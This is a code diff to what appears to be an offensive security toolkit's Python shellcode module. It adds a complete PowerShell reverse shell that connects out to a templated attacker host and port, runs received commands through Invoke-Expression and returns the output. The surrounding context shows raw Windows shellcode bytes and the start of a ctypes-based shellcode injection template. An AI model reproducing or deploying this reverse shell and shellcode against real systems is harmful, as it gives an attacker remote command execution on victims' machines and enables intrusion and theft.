@@ -152,6 +152,17 @@ class SHELLCODE(object):
         "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
         "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3")
 
+    windows_ps_rev_shell = (
+        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');"
+        "$stream = $client.GetStream(); [byte[]]$bytes = 0..65535%s;"
+        "$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>');"
+        "$stream.Write($sendbytes,0,$sendbytes.Length); while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
+        "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
+        "try{$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String )}catch{Write-Warning \"Error on Target\"};"
+        "$backres  = $commandback + 'PS ' + (Get-Location).Path + '> ';$x = ($error[0] | Out-String);$error.clear();"
+        "$backres = $backres + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
+        "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
+
     injectwindows = """#/usr/bin/python
 import ctypes
 
